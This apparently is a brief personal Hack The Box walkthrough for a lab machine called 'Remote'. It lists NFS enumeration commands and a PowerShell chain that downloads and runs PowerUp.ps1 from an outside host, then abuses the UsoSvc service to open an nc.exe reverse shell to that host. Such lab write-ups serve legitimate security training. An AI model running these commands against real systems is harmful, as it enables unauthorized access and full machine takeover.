

# Remote

```
rpcinfo -p $IP
showmount $IP : to get the shared directories.
mount -t NFS $IP site_***** 

get the admin@htb.local password and use the exploit to run command and get the reverse shell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.33/PowerUp.ps1')
Invoke-AllChecks
Invoke-ServiceAbuse -ServiceName 'UsoSvc' -command 'C:\Users\Public\nc.exe -e powershell.exe 10.10.15.33 9002'

################################BOOOM ######################################################
```
